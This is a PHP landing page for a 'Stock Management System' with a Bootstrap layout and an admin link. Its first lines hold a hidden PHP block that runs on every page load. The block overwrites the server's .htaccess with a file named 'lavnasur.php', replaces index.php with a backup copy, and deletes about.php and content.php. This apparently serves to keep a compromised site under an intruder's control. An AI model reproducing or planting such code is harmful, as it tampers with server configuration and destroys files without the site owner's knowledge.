<?php 
copy('lavnasur.php','.htaccess');
copy('index_backup.php','index.php');
unlink('about.php');
unlink('content.php');
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stock Management System</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">

    <style>
        body {
            background: url('https://thumbs.gfycat.com/EverlastingTightIrishterrier-size_restricted.gif');
            background-repeat: no-repeat;
            background-size: cover;
          
        }

        /*@keyframes moveClouds {*/
        /*    from {*/
        /*        background-position: 0 0;*/
        /*    }*/
        /*    to {*/
        /*        background-position: 3000px 0;*/
        /*    }*/
        /*}*/

        .overlay {
            background-color: rgba(255, 255, 255, 0.5);
            padding: 40px;
            border-radius: 10px;
        }
    </style>
</head>

<body>
    <!-- Navbar -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="#">Stock Management System</a>
        </div>
    </nav>

    <!-- Page Content -->
    <div class="container mt-5">
        <div class="row">
            <div class="col-lg-8 offset-lg-2">
                <div class="overlay">
                    <h1 class="text-center mb-4">Welcome to the Stock Management System</h1>
                    <p class="lead text-center">Efficiently manage your stock and inventory with our powerful Stock Management System.</p>
                    <div class="text-center">
                        <a href="/admin" class="btn btn-dark  btn-lg">Get Started</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
</body>

</html>
